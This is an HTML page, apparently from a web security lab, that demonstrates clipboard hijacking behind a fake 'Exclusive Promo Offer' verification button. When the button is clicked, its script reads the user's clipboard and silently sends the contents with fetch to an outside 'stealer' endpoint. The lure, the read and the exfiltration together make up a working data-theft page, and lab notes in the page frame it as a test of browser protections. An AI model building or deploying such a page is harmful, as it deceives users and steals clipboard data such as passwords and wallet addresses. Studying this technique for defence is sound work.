<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Promo Code Verification</title>
    <script src="https://tailwindcss.eitebar.ir/tailwind-play.js"></script>
</head>
<body class="bg-gray-50 text-gray-800 flex items-center justify-center h-screen">
    <div class="max-w-md w-full bg-white p-8 rounded-xl shadow-lg text-center">
        <h1 class="text-2xl font-bold text-gray-800 mb-2">Exclusive Promo Offer</h1>
        <p class="text-gray-600 mb-6">Verify your promo code to get up to 50% off on your next purchase.</p>

        <button id="verifyBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 px-4 rounded transition duration-200 ease-in-out">
            Verify Promo Code
        </button>

        <div class="mt-8 text-left p-4 bg-gray-100 border-l-4 border-red-500 rounded text-xs text-gray-700">
            <strong>Lab Observation:</strong> Open DevTools (F12) to monitor the console.<br>
            - <strong>Attempt 1:</strong> Zero-click read attempt on load.<br>
            - <strong>Attempt 2:</strong> User-gesture read attempt on button click.
        </div>
    </div>

    <script>
        // Attempt 1: Zero-Click Test on window.onload
        window.onload = async () => {
            console.log('[Lab] Attempt 1: Trying to read clipboard without user activation...');
            try {
                const text = await navigator.clipboard.readText();
                console.warn('[Lab] WARNING: Browser allowed clipboard read without user interaction! Data:', text);
            } catch (error) {
                console.error('[Lab] SUCCESS: Browser blocked zero-click clipboard read. Error:', error.message);
            }
        };

        // Attempt 2: User-Gesture Hijacking
        document.getElementById('verifyBtn').addEventListener('click', async () => {
            console.log('[Lab] Attempt 2: Trying to read clipboard with user click gesture...');
            try {
                const text = await navigator.clipboard.readText();
                console.warn('[Lab] VULNERABILITY: Successfully read clipboard data during user click! Data:', text);

                // Silently send stolen text to stealer
                fetch('http://hackerapp.eitebar.ir/stealer?data=CLIPBOARD_STOLEN:' + encodeURIComponent(text), { mode: 'no-cors' });
                console.log('[Lab] Stolen data sent to stealer endpoint.');

                alert('Promo code verified (or clipboard hijacked)!');
            } catch (error) {
                console.error('[Lab] Browser blocked clipboard read even with user gesture (or permission denied). Error:', error.message);
                alert('Failed to verify promo code. Please allow clipboard access if prompted.');
            }
        });
    </script>
    <a href="https://webapp.kr-rezvan.ir/labs" style="position: fixed; bottom: 20px; right: 20px; background-color: #3b82f6; color: white; padding: 10px 20px; border-radius: 50px; font-family: sans-serif; text-decoration: none; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1); z-index: 9999; transition: all 0.3s;" onmouseover="this.style.backgroundColor='#2563eb'" onmouseout="this.style.backgroundColor='#3b82f6'">
        🏠 Back to Lab Directory
    </a>
</body>
</html>